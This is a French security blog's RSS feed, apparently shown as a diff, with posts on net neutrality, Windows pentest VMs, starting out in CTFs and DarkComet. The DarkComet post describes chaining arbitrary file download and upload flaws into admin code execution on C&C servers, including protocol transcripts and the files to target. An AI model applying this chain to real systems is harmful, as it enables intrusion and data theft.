+<p><img src="https://media.giphy.com/media/UOOrmYpZPwRm8/giphy.gif" alt="US"></p>
+<p>En Europe, fort heureusement, les institutions tiennent *encore* le coup face aux grands groupes (mais pour combien de temps encore ? 🙁 ).</p>
+<p><img src="https://media.giphy.com/media/l3mZ99WVXIFIGsZY4/giphy.gif" alt="UE"></p>
+<p>Tout ça pour dire que si vous avez un gros doute sur votre Fournisseur d&rsquo;Accès à Internet (FAI), vous pouvez toujours faire ce <a href="https://ip.lafibre.info/neutralite.php" rel="noopener noreferrer" target="_blank">test</a> (<a href="https://ip.lafibre.info/neutralite.php" rel="noopener noreferrer" target="_blank">https://ip.lafibre.info/neutralite.php</a>) ultra simple sur lequel je suis tombé avec un ami totalement par hasard il y a quelques jours alors que nous faisions des tests pour une future surprise que je vous réserve dans un prochain article 😉.</p>
+<p>Le test est on ne peut plus simple :</p>
+<p>Deux images doivent être téléchargées, l&rsquo;une via HTTP, l&rsquo;autre via HTTPS, si l&rsquo;une des deux images est plus légère que l&rsquo;autre alors vous avez du souci à vous faire !!!</p>
+<p>En effet, si vous constatez une différence de poids, alors il faut comparer le poids de référence (ex: pour la première image, 43 225 octets) et voir laquelle est fautive:</p>
+<p>S&rsquo;il s&rsquo;agit de l&rsquo;image en HTTP, cela peut vouloir dire que votre FAI prends un malin plaisir à manipuler les images afin de réduire leur taille (et bafoue au passage le principe de neutralité du net 😠).</p>
+<p><img src="https://media.giphy.com/media/1236TCtX5dsGEo/giphy.gif" alt="Bravo!"></p>
+<p>Si en revanche il s&rsquo;agit de l&rsquo;image en HTTPS, alors courez vite débrancher / rebrancher votre Box internet et refaites le test car c&rsquo;est sûrement le signe qu&rsquo;on écoute votre connexion internet 😰 !!!</p>
+<p><img src="https://media.giphy.com/media/xT39D0tJm471uhvhaU/giphy.gif" alt="AV"><figcaption>C&rsquo;est ce qui s&rsquo;appelle un bon « Firewall » 🙂</figcaption>En ce qui me concerne, je me suis fait un petit script qui m&rsquo;a donné ce résultat :</p>
+<pre>
+[✓] IMAGE_HTTP:     43 225
+|✓] IMAGE_HTTPS:    43 225
+
+[✓] Le FAI est neutre !
+
+</pre>
+<p><img src="https://media.giphy.com/media/26tPo1I4XyWzIBjFe/giphy.gif" alt="content"><figcaption>Oui, j&rsquo;ai dansé comme ça dans ma chambre 🙂 </figcaption>J&rsquo;ai écrit le petit script en Shell, car honnêtement je ne connais pas plus léger et plus facile à faire pour tout ce qui est Linux / Mac OS&#8230; Sachez néanmoins que si par malheur vous êtes l&rsquo; « heureux » «  »possesseur » » d&rsquo;un Windows, ou juste que vous voulez me voir coder un script pour ce magnifique et très beau système d&rsquo;exploitation #sarcasme n&rsquo;hésitez pas à me le faire savoir, je serais ravi de rendre service (ça sera l&rsquo;occasion de faire un dépôt Github pour le blog) !</p>
+<p>Voili, voilou, j&rsquo;espère que cet article vous a plus, n&rsquo;hésitez pas à le partager avec vos collègues ou vos amis pour qu&rsquo;on connaisse un peu l&rsquo;état des lieux de la neutralité du net en Europe (ou ailleurs !) en 2019. Ça peut être aussi une très belle occasion pour prendre conscience de la sûreté de sa connexion (surtout si on se rend compte qu&rsquo;on est sur écoute !).</p>
+<p>d&rsquo;ici là portez vous bien, buvez de l&rsquo;eau et à bientôt tout le monde !</p>
+<p><img src="https://i.imgur.com/ehlPHlP.jpg" alt="neutralité"></p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/systeme/neutralite-du-net-comment-savoir-si-votre-fai-est-neutre/">Neutralité du Net &#8211; Comment savoir si votre FAI est neutre ?</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Commando et Flare VM pour terminer Windows (usine à gaz)²</title>
+		<link>https://hackonch.ml/fr/fun/commando-et-flare-vm-pour-terminer-windows-usine-a-gaz%c2%b2/</link>
+				<pubDate>Wed, 03 Jul 2019 20:13:02 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Coup de Gueule]]></category>
+		<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Système]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1155</guid>
+				<description><![CDATA[<div class="post-excerpt">Coucou tout le monde, Je ne sais pas pour vous, mais lorsque je faisais mes débuts en hacking et que le seul langage que j&#8217;arrivais à peu près à maîtriser&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/fun/commando-et-flare-vm-pour-terminer-windows-usine-a-gaz%c2%b2/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/commando-et-flare-vm-pour-terminer-windows-usine-a-gaz%c2%b2/">Commando et Flare VM pour terminer Windows (usine à gaz)²</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Coucou tout le monde, </p>
+<p>Je ne sais pas pour vous, mais lorsque je faisais mes débuts en hacking et que le seul langage que j&rsquo;arrivais à peu près à maîtriser c&rsquo;était le Batch, j&rsquo;ignorais complètement l&rsquo;existence de Linux !</p>
+<p>Par pitié ne me jugez pas, j&rsquo;ai déjà assez honte comme ça de l&rsquo;écrire 😣 ! </p>
+<p>Il faut dire que j&rsquo;étais vraiment un noob , à tel point que je pensais que tous les grands piratages étaient faits sur Windows (j&rsquo;étais bien naïf). Donc lorsqu&rsquo;un jour un camarade me révèle l&rsquo;existence de BackTrack 5 r3 (nouvellement GNU Kali Linux), j&rsquo;étais tout émoustillé de faire mes premiers <strong>VRAIS</strong> pas dans le monde du hacking le tout émulé bien sûr dans une machine virtuelle (Virtual Box à l&rsquo;époque 🙂 ), car j&rsquo;avais je cite « peur de casser mon ordinateur » (ahh, ce que je pouvais être *tellement* naïf&#8230;)</p>
+<p>Pourquoi est-ce que je vous dis tout ça ? C&rsquo;est très simple, lorsque j&rsquo;étais plus jeune, les distributions Windows orienté hacking ça n&rsquo;existait pas&#8230; </p>
+<p><img src="https://i.imgur.com/cYOMBDF.png" alt="capture" /><br />
+<img src="https://i.imgur.com/KSkcVsS.png" alt="capture" /></p>
+<p>Maintenant oui.</p>
+<p><img src="https://media.giphy.com/media/RVZD5dJ5fviUg/giphy.gif" alt="meme" /></p>
+<p>En toute honnêteté je suis complètement passé à côté. À tel point que si j&rsquo;en parle aujourd&rsquo;hui, c&rsquo;est exclusivement parce que certains d&rsquo;entre vous, que je remercie au passage, m&rsquo;ont demandé d&rsquo;en parler, de dire un peu ce que j&rsquo;en pensais etc&#8230; (n&rsquo;hésitez d&rsquo;ailleurs pas à continuer à m&rsquo;écrire, j&rsquo;en suis super ravi).</p>
+<p>Au départ, je dois vous avouer que j&rsquo;ai cru à une farce ou à une info vraisemblablement pas vérifiée ou mal interprétée, c&rsquo;est pourquoi j&rsquo;ai vérifié par moi-même&#8230; Je suis bien resté 2 minutes devant mon écran à ne pas savoir comment réagir. En effet, je ne sais pas si je dois rire ou si je dois pleurer de rire devant le fait que « ça y est, en 2019, Windows a deux « distributions » et elles sont toutes les deux orientées sécurité informatique ».</p>
+<p>Les anciens du site pourront vous l&rsquo;attester, j&rsquo;aime bien taper sur Windaube et peut-être d&rsquo;ailleurs que ça ne fait rire que moi mais je trouve carrément tordant le fait de mettre « Windows » et « Hacking » dans la même phrase. </p>
+<p><img src="https://media.giphy.com/media/HyvjlU00Ad4xq/giphy.gif" alt="hackerus windowsius" /><figcaption>un authentique spécimen de hackerus windowsius 🙂</figcaption></p>
+<p>Bon plus sérieusement, j&rsquo;ai quand même voulu tester ces deux distrib Lin..Windows (la bonne blague) et je peux vous affirmer que dès le début on ressent bien le côté machine à gaz de Windows. </p>
+<p>Tout d&rsquo;abord, il faut savoir que ces deux distrib sont publiées par <strong>FireEye</strong>. Pour ceux qui ne connaisseraient ce nom et qui seraient un peu plus branchés jeux vidéos, sachez que si <strong>Kaspersky</strong> est un peu le « <strong>Ubisoft</strong> » de la sécurité informatique, <strong>FireEye</strong>, c&rsquo;est plus l&rsquo; « Electronic Arts » (EA) de la sécurité informatique. Il s&rsquo;agit donc d&rsquo;une grosse entreprise Américaine qui a des contrats un peu partout et qui prend un malin plaisir à faire la chasse aux groupes d’hackeurs gouvernementaux « ennemis ». </p>
+<p>Enfin bref, tout ça pour dire que c&rsquo;est la même entité qui publie ces distributions (qui sont d&rsquo;ailleurs plus proches du pack de logiciel que de la véritable distribution). </p>
+<p>Il y a donc deux packs, le starter pack du parfait Malware Hunter(chasseur de virus)/ Ingénieur Forensic nommé « Flare VM » et le starter pack du parfait Pentester / jean-Hackeur en puissance, avec Commando VM</p>
+<p><img src="https://media.giphy.com/media/eCqFYAVjjDksg/giphy.gif" alt="jean-hackeur" /><figcaption>un authentique spécimen de jean-hackerus en puissanctus  🙂</figcaption></p>
+<p>Pour installer une des deux versions (Flare VM ou Commando VM) il faut au préalable avoir installé une machine virtuelle avec Windows 7, <del datetime="2019-07-03T18:15:09+00:00">8</del>, 8.1 ou <del datetime="2019-07-03T18:15:09+00:00">9</del> 10 et être allé sur le dépot github associé à la version (<a href="https://github.com/fireeye/flare-vm" rel="noopener noreferrer" target="_blank">https://github.com/fireeye/flare-vm</a> ou <a href="https://github.com/fireeye/commando-vm" rel="noopener noreferrer" target="_blank">https://github.com/fireeye/commando-vm</a>) afin de télécharger et exécuter un petit fichier powershell « Install.ps ».</p>
+<p>Lorsque le script a installé pour 60 Go de disque dur (oui oui, c&rsquo;est dans la configuration requise *MINIMALE*) vous voici avec votre fond d&rsquo;écran changé </p>
+<p><img src="https://i.imgur.com/cYOMBDF.png" alt="capture" /></p>
+<h3>OU</h3>
+<p><img src="https://i.imgur.com/KSkcVsS.png" alt="capture" /></p>
+<p>Et voilà ! Vous êtes partis pour faire la même chose que sur <strong>GNU Kali Linux</strong> mais en moins bien et en deux téléchargements différents le tout sur la plus vulnérable de toutes les machines à gaz (Bah oui il ne faut pas non plus s&rsquo;imaginer laisser Windows Defender allumé, ça serait pas drôle sinon)!! Comment?! que dites-vous ? « Oui mais là c&rsquo;est un truc spécial pour Windows » ? Aurais-je entendu dans le fond de la salle ? Ha ha&#8230; Vous êtes si naïfs&#8230;</p>
+<p><img src="https://media.giphy.com/media/fYsyULfLlvBzW/giphy.gif" alt="lol" /><figcaption>Je suis sûr que plus d&rsquo;un « Windowsien » aura cette réaction en fin d&rsquo;article  🙂 </figcaption></p>
+<p>D&rsquo;après le dépôt github, « <a href="https://github.com/fireeye/flare-vm#pentest" rel="noopener noreferrer" target="_blank">https://github.com/fireeye/flare-vm#pentest</a> » pour être plus précis, on voit très clairement écrit que la partie « Pentest » de Flare VM est constitué de « Windows binaries from Kali Linux » (Binaires Windows provenant de <strong>*GNU*</strong> Kali Linux). Ainsi, comme vous pouvez l&rsquo;imaginer, il en est de même pour Commando VM où là encore est précisé « Windows binaries from Kali Linux » en plus d&rsquo;être confirmé dans la « note légale » (<a href="https://github.com/fireeye/commando-vm#legal-notice" rel="noopener noreferrer" target="_blank">https://github.com/fireeye/commando-vm#legal-notice</a> pour ceux qui veulent vérifier). </p>
+<p>Bon, pour en dire du bien, il y a bien quelques nouveautés, comme un semblant d&rsquo;installateur de paquets nommé <del datetime="2019-07-03T18:15:09+00:00">*apt*</del> « cup » ou encore une sorte de toute nouvelle version 2.0 qui apporte, je cite, « pleins de nouveaux changements » et qui n&rsquo;est bien évidement pas installable via ce même installateur de paquets #payetonutilité. </p>
+<p>En bref, vous l&rsquo;avez peut-être compris en lisant cet article, je suis loin d&rsquo;être conquis à l&rsquo;idée d&rsquo;utiliser le jumeau lourdement handicapé d&rsquo;un pauvre « GNU Kali Linux ».exe</p>
+<p>Je tire peut-être sur l&rsquo;ambulance, mais quand je vois le niveau d&rsquo;utilité / de mise au point du truc, je ne peux pas m&#8217;empêcher de me poser la question « Pourquoi ? » :</p>
+<p>Pourquoi tenter une distrib sur Windows alors que ça ne marche tout simplement pas ! Sérieusement, il n&rsquo;y a qu&rsquo;à regarder la configuration minimum requise : 4Go de RAM pour 60Go de disque !!</p>
+<p>Pourquoi ne pas avoir fait une distribution Linux du truc ? Ça aurait quand même déjà un peu plus de crédibilité et un minium de viabilité 🙁 </p>
+<p>Pourquoi est-ce qu&rsquo;il a fallu attendre 2019 pour voir apparaître les premières distributions « hacking » sur Windows ? </p>
+<p><img src="https://media.giphy.com/media/b8jefh8LnBmMw/giphy.gif" alt="questions" /></p>
+<p>En attendant de trouver des réponses à ces grandes questions sans doute sans réponses de l&rsquo;Univers, vous pouvez toujours faire parler du blog autour de vous si le site vous plait et que vous avez envie qu&rsquo;il prenne plus d&rsquo;ampleur !</p>
+<p>Ça me fait énormément plaisir à chaque fois de voir le nombre de visiteurs augmenter, n&rsquo;hésitez pas non plus à me proposer des idées d&rsquo;articles je lis bien entendu tous vos messages 😉 </p>
+<p>Aller portez-vous bien et d&rsquo;ici là, à la prochaine !</p>
+<p><img src="https://i.imgur.com/hqP2n6U.jpg" alt="richard approuve" /></p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/commando-et-flare-vm-pour-terminer-windows-usine-a-gaz%c2%b2/">Commando et Flare VM pour terminer Windows (usine à gaz)²</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Comment bien débuter dans les CTF</title>
+		<link>https://hackonch.ml/fr/diy/comment-bien-debuter-dans-les-ctf/</link>
+				<pubDate>Wed, 22 May 2019 15:46:52 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[DIY]]></category>
+		<category><![CDATA[Fun]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1026</guid>
+				<description><![CDATA[<div class="post-excerpt">Bonjour à tous, Avant de commencer, ceux qui suivent déjà le blog doivent déjà savoir ce qu&#8217;est un CTF (Capture The Flag), pour les autres qui découvrent le site ou&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/diy/comment-bien-debuter-dans-les-ctf/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/diy/comment-bien-debuter-dans-les-ctf/">Comment bien débuter dans les CTF</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Bonjour à tous,</p>
+<p>Avant de commencer, ceux qui suivent déjà le blog doivent déjà savoir ce qu&rsquo;est un CTF (Capture The Flag), pour les autres qui découvrent le site ou qui ne sont pas sûr, allez par <a href="https://blog.tchernobyl.ml/fun/les-capture-the-flag-un-bon-moyen-dentretenir-sa-forme/" rel="noopener noreferrer" target="_blank">ici</a> jeter un petit coup d&rsquo;oeil 🙂</p>
+<p>J&rsquo;ai été ravi de voir que mon précédent article sur les <a href="https://blog.tchernobyl.ml/fun/les-capture-the-flag-un-bon-moyen-dentretenir-sa-forme/" rel="noopener noreferrer" target="_blank">Capture The Flag</a> en a convaincu plus d&rsquo;un à se lancer dans l&rsquo;aventure. Mais même si mon article a plu, d&rsquo;en l&rsquo;ensemble j&rsquo;ai constaté que je ne répondais pas à toutes les interrogations qu&rsquo;un <a href="https://translate.google.com/?um=1&amp;ie=UTF-8&amp;hl=fr&amp;client=tw-ob#en/fr/newbie" rel="noopener noreferrer" target="_blank">newbie</a> peut se poser.</p>
+<p>C&rsquo;est pourquoi aujourd&rsquo;hui, je vous partage LA bonne recette en trois étapes pour bien débuter dans les CTF.</p>
+<h3>1°) Le matériel </h3>
+<blockquote><p>On ne fait pas d&rsquo;omelettes sans casser d’œufs mais encore faut-il en avoir !</p></blockquote>
+<p>Eh oui ! le matériel c&rsquo;est hyper important. En vérité pour les CTF, il n&rsquo;y a pas besoin non plus d&rsquo;une machine de guerre en terme de performances. Par exemple, lorsque je débutais, je me rappel de ce vieux Nec m320 qui datait de 2003 et qui pesait 5 Kg au moins et même si c&rsquo;était pas le grand luxe, j&rsquo;en ai quand même de super bons souvenirs avec.</p>
+<p><img src="https://www.diltoo.com/Photos/27/27550-ordinateur-portable-nec-1.jpg" width="450" height="600" class="alignnone size-full wp-image-1027" /><figcaption>Aaahh la belle époque des ordis portables qui faisaient le même poids qu&rsquo;un sac de patate 🙂 </figcaption></center></p>
+<p>Vous l&rsquo;aurez compris, ça ne sert pas à grand chose d&rsquo;investir dans des PC gamers à 2 000 € uniquement pour du CTF. On peut très bien recycler un vieil ordinateur pour commencer. </p>
+<p>En revanche ce qu&rsquo;il faut IM-PÉ-RA-TI-VE-MENT c&rsquo;est un système d&rsquo;exploitation adéquat. Fini donc le Windows 10 ou même le Mac OS X ! Ce qu&rsquo;il faut c&rsquo;est du Linux 🐧</p>
+<p><img src="https://memegenerator.net/img/instances/61963857/linux-linux-everywhere.jpg" alt="linux everywhere" /></p>
+<p>Il y a en effet un bon panel de distributions Linux spécialisées dans la sécurité informatique ou le hacking mais mon petit top personnel reste le suivant: </p>
+<ul>
+<li><a href="https://www.kali.org/" rel="noopener noreferrer" target="_blank">Kali Linux</a> (anciennement Backtrack, user friendly)</li>
+<li><a href="https://archstrike.org/" rel="noopener noreferrer" target="_blank">Archstrike</a> (pas pour les débutants ⚠️)</li>
+<li><a href="https://www.backbox.org/" rel="noopener noreferrer" target="_blank">Back Box</a> (basée sur Ubuntu)</li>
+<li><a href="https://www.parrotsec.org/" rel="noopener noreferrer" target="_blank">Parrot OS</a> (un fork de Kali Linux)</li>
+</ul>
+<p>Il est important que vous vous forgiez votre propre avis par la suite mais pour débuter, l&rsquo;écrasante majorité commence sur Kali Linux. C&rsquo;est en effet une distribution très stable, basée sur Debian et en plus la communauté derrière Kali Linux est assez importante. Ce qui veut dire que la plupart des soucis de compatibilités avec les pilotes, etc.. ont déjà une solution en ligne, et ça c&rsquo;est tip top, surtout quand on débute 🙂 .</p>
+<h3>2°) Où trouver les images CTF ? </h3>
+<p>Un CTF, c&rsquo;est avant tout un fichier d&rsquo;image disque&#8230; mais pas que. En effet, dans mon précédent article, j&rsquo;avais traité d&rsquo;un site (<a href="https://www.vulnhub.com/" rel="noopener noreferrer" target="_blank">Vulnhub</a>) qui fournit des fichiers d&rsquo;images à télécharger et qu&rsquo;on peut très facilement monter en local sur une machine virtuelle (Virtual Box ou KVM).</p>
+<p>Le truc c&rsquo;est que pour débuter, c&rsquo;est pas forcément évident de configurer une machine virtuelle. C&rsquo;est pourquoi d&rsquo;autre sites existent:</p>
+<p>On peut citer <a href="https://www.root-me.org/" rel="noopener noreferrer" target="_blank">Root-Me</a>, qui est une association francophone (cocorico) à but non lucratif visant à promouvoir les connaissances en matière de piratage et de sécurité de l&rsquo;information. La plateforme fournit tous pleins de challenges super bien faits dans diverses catégories (Réseau, programmation, Web, stéganographie, etc&#8230;) en plus d&rsquo;une section CTF ou plusieurs machines sont mises à disposition de la communauté avec un large choix d&rsquo;images. Pour être membre actif et supportant l&rsquo;association je dois reconnaître qu&rsquo;il s&rsquo;agit là d&rsquo;un chouette projet.</p>
+<p>Pour ceux qui n&rsquo;ont pas peur d&rsquo;oser l&rsquo;anglais, <a href="https://www.hackthebox.eu/" rel="noopener noreferrer" target="_blank">Hack The Box</a> est aussi une bonne adresse. En effet il s&rsquo;agit d&rsquo;une plateforme spécialisé dans les CTF. Les images sont faites mains exclusivement par des membres de la communauté, il en existe de tous les niveaux et de toutes les couleurs. Tout comme Root-Me il y a zéro configuration à faire, tout est en ligne. Seul un accès au <a href="https://blog.tchernobyl.ml/diy/monter-son-propre-vpn-comme-un-nul-introduction/" rel="noopener noreferrer" target="_blank">VPN</a> doit être configuré mais tout est super bien expliqué sur le site.</p>
+<p>Je pense avoir fait le tour concernant les meilleurs sites où on peut déguster de savoureux CTF, si certains connaissent d&rsquo;autres sites, je serais plus que ravis de les rajouter !</p>
+<h3>3°) C&rsquo;est parti !</h3>
+<p>Maintenant qu&rsquo;on a tout ce qu&rsquo;il nous faut, il ne reste plus qu&rsquo;à s&rsquo;amuser et à prendre du bon temps en attendant la Nuit du Hack ! </p>
+<p>Si cet article vous a plu, vous pouvez le partagez avec vos amis (plus on est de fou, plus on ris 🙂 ). </p>
+<p>N&rsquo;hésitez pas aussi à commenter ou à m&rsquo;envoyer des petits messages pour des idées d&rsquo;articles, des recommandations ou autres, je les lis tous !</p>
+<h3>Quelques liens</h3>
+<p><a href="https://www.kali.org/" rel="noopener noreferrer" target="_blank">https://www.kali.org/</a>   &#8211; Kali Linux<br />
+<a href="https://archstrike.org/" rel="noopener noreferrer" target="_blank">https://archstrike.org/</a> &#8211; ArchStrike<br />
+<a href="https://www.backbox.org/" rel="noopener noreferrer" target="_blank">https://www.backbox.org/</a>    &#8211; BackBox<br />
+<a href="https://www.parrotsec.org/" rel="noopener noreferrer" target="_blank">https://www.parrotsec.org/</a>  &#8211; Parrot OS</p>
+<p><a href="https://www.root-me.org/" rel="noopener noreferrer" target="_blank">https://www.root-me.org/</a>    &#8211; Root-Me<br />
+<a href="https://www.hackthebox.eu/" rel="noopener noreferrer" target="_blank">https://www.hackthebox.eu/</a>  &#8211; Hack The Box<br />
+<a href="https://www.vulnhub.com/" rel="noopener noreferrer" target="_blank">https://www.vulnhub.com/</a>    &#8211; Vulnhub</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/diy/comment-bien-debuter-dans-les-ctf/">Comment bien débuter dans les CTF</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Malware Hunting 2/? : La fin de DarkComet</title>
+		<link>https://hackonch.ml/fr/fun/malware-hunting-2-la-fin-de-darkcomet/</link>
+				<pubDate>Tue, 14 May 2019 18:36:13 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Malware-Hunting]]></category>
+		<category><![CDATA[Système]]></category>
+		<category><![CDATA[Vie Privée]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=983</guid>
+				<description><![CDATA[<div class="post-excerpt">Salut tout le monde! Je ne sais pas vous mais lorsque j&#8217;étais plus jeune, il y avait eu une énorme tendance à faire des vidéos et des tutos de hacking&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/fun/malware-hunting-2-la-fin-de-darkcomet/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/malware-hunting-2-la-fin-de-darkcomet/">Malware Hunting 2/? : La fin de DarkComet</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Salut tout le monde! </p>
+<p>Je ne sais pas vous mais lorsque j&rsquo;étais plus jeune, il y avait eu une énorme tendance à faire des vidéos et des tutos de hacking sur Windows. C&rsquo;était d&rsquo;ailleurs à cette époque que des outils comme <strong>LOIC</strong> sont devenus populaires étant donné que le hacking s&rsquo;était vulgarisé à en devenir littéralement du « point to click » comme dans les jeux vidéos.</p>
+<p>Aujourd&rsquo;hui, dans ce nouvel opus de cette mini-série nous allons traiter d&rsquo;un logiciel devenu populaire à ce moment-là: <strong>DarkComet</strong></p>
+<h3> Pour la petite histoire </h3>
+<p>DarkComet était un cheval de Troie (Un type de logiciel connu sous son abréviation anglaise « RAT ») développé par un programmeur indépendant Français. </p>
+<p>Bien que ce logiciel ait été développé en 2008, il a néanmoins commencé à proliférer au début de l&rsquo;année 2012. Le developpement du logiciel fut annulé, partiellement à cause de son utilisation pendant la guerre civile syrienne pour surveiller des activistes, mais aussi car son créateur avait peur qu&rsquo;il soit arrêté.</p>
+<h3> Utilisation </h3>
+<p>Il est à noter que même si son developpement a été arrêté en juillet 2012, le logiciel est toujours largement utilisé en France comme le montre ces statistiques toutes fraîches que j&rsquo;ai concocté avec l&rsquo;aide de Shodan:</p>
+<p><img src="https://i.imgur.com/4qYKNRm.jpg" alt="" width="800" height="600" class="alignnone size-medium wp-image-1002" /><figcaption>Des stats toutes fraîches 🙂 </figcaption>Comme on peut le voir, sur le nombre de serveurs de Contrôle et de Commandes que la plateforme a pu recenser en France, plus de 50% des 5 chevaux de Troie les plus répandus dans l&rsquo;hexagone sont des serveurs DarkComet.</p>
+<p>Si le cadre de l&rsquo;article précédent existait (mise en place de véritables fondements au hacking éthique) et que l&rsquo;on souhaitait frapper un grand coup, il faudrait probablement s&rsquo;attaquer aux serveurs DarkComet car ceux-ci représentent à eux seuls 50% du parc cybermalveillant français.</p>
+<h3> Ce que l&rsquo;on sait déjà </h3>
+<p>Darkcomet a déjà par le passé été victime d&rsquo;une vulnérabilité. En effet, depuis 2015, on sait qu&rsquo;il est possible de provoquer une « Arbitrary File Download » ou téléchargement de fichier arbitraire en français sur n&rsquo;importe quel serveur DarkComet. Cependant, bien que cette vulnérabilité soit intéressante elle n&rsquo;est pas critique pour le serveur.Un point de départ logique serait donc d&rsquo;examiner la fonctionnalité d&rsquo;envois de fichiers de DarkComet (de serveur à ordinateur infecté).</p>
+<p>Le serveur utilise un modèle de transaction bien précis qui ressemble à celui-ci (« S » désigne le serveur et « I » l&rsquo;ordinateur infecté):</p>
+<pre>
+S: QUICKUP C:unfichier.jpg | 123 | UPLOADEXEC
+Le client initie une nouvelle connection avec "QUICKUP"
+
+I: QUICKUP 123 | C:unfichier.jpg | UPLOADEXEC
+S: "x41x00x43"
+I: Ack
+S: "longueur du fichier"
+I: Ack
+S: "flux binaire brut"
+</pre>
+<p>Le serveur C&amp;C ne vérifie pas s&rsquo;il a déjà émis une commande de téléchargement. Ce qui signifie que toute personne se connectant au serveur peut télécharger n’importe quel fichier du serveur.<br />
+Malheureusement, comme il n’existe aucun moyen de faire en sorte que le serveur répertorie tous les fichiers d’un répertoire, cette vulnérabilité est limitée au téléchargement de fichiers connus de l&rsquo;attaquant. </p>
+<p>Parmis les divers fichiers que l&rsquo;on peut atteindre, on peut s&rsquo;amuser à viser deux fichiers sensibles pour le serveur: </p>
+<p>1°) comet.db qui comme son nom l&rsquo;indique est une base de donnée (SQLite) qui contient une liste de tous les ordinateurs infectés (dont adresses IP/MAC, Pays, nom d&rsquo;utilisateur courant, version du système d&rsquo;exploitation&#8230;). Cette base de donnée peut aussi contenir des données d&rsquo;enregistrement de frappes au claviers.</p>
+<p>2°) config.ini qui contient en clair tous les mots de passes relatifs à la configuration du serveur DarkComet.</p>
+<p>Vous l&rsquo;avez compris, cette vulnérabilité est pour le moins intéressante mais malheureusement, elle ne nous permet pas directement de mettre la main sur le serveur. </p>
+<h3> Un peu de recherche </h3>
+<p>Examinons maintenant la fonction de téléchargement des fichiers (d&rsquo;ordinateur infecté à serveur).<br />
+Lorsque le serveur DarkComet tente de télécharger un fichier, voici ce qui se passe:</p>
+<pre>
+S: DOWNLOADFILE 596 | C:unfichier.jpg
+Le client ouvre alors une nouvelle connexion:
+
+I: FILETRANSFER | 596
+S: "x41x00x43"
+I: FILEBOF C:unfichier.jpg | 0
+S: Ack
+I: "flux binaire brut"
+</pre>
+<p>Le serveur va écrire le fichier dans un répertoire spécifié par l&rsquo;utilisateur avec le nom « fichier.jpg ». Bien qu&rsquo;en apparence, cela puisse sembler tout autant exploitable que la précédente fonction, ça ne l&rsquo;est malheureusement pas. En effet, Le 596 dans « DOWNLOADFILE 596 » est l&rsquo;identifiant de <a href="https://fr.wikipedia.org/wiki/Socket" rel="noopener noreferrer" target="_blank">socket</a> du client et le serveur n&rsquo;accepterait pas FILETRANSFER | 596 s&rsquo;il n&rsquo;a pas précédement émis sur un socket identique.</p>
+<p>Même si elle n&rsquo;est pas évidente aux premiers abords, la vulnérabilité est bien là. Je laisse d&rsquo;ailleurs le détail pour ceux à qui ça interesse à l&rsquo;ami <strong>PseudoLaboratories</strong> qui est l&rsquo;auteur de la trouvaille.</p>
+<p>Tout ça pour dire que l&rsquo;exploitation de la vulnérabilité nous mène à un envoie de fichier arbitraire. Envoie que l&rsquo;on peut utiliser pour provoquer une: *roulement de tambours*&#8230;</p>
+<h3> Exécution de code à distance </h3>
+<p>En effet, le serveur DarkComet essaiera par défaut d’utiliser UPnP pour ouvrir automatiquement les ports. Pour ce faire, il écrit un fichier appelé « upnp.exe » dans le répertoire Temp et l’appelle si nécessaire. </p>
+<p>Il suffit donc que l&rsquo;on se serve dans un premier temps de la vulnérabilité de téléchargement de fichiers arbitraire afin de lire le nom d&rsquo;utilisateur courant puis dans un second temps, que l&rsquo;on se serve de la vulnérabilité d&rsquo;envoi de fichiers arbitraire afin d&rsquo;envoyer notre code dans le bon répertoire. </p>
+<p>Au prochain démarrage du serveur, « upnp.exe » et ainsi notre code sera exécuté.</p>
+<h3> Élévation des privilèges </h3>
+<p>La suite naturelle des choses serait de trouver un moyen de devenir administrateur sauf qu&rsquo;ici le travail est déjà mâché par DarkComet. </p>
+<p>En effet, comme le logiciel demande les privilèges administrateur à chaque démarrage, par principe d&rsquo;héritage, tout code exécuté par celui-ci est donc exécuté avec les privilèges administrateur, incluant donc notre code.</p>
+<h3>Conclusion</h3>
+<p>DarkComet est un logiciel très bien développé, à tel point qu&rsquo;il s&rsquo;agisse du trojan le plus populaire en France, et d&rsquo;ailleurs un des plus populaire dans le monde. Il est à peu près certains que si le développement du logiciel était toujours d&rsquo;actualité, les failles citées dans cet article ne seraient plus exploitables depuis un long moment. </p>
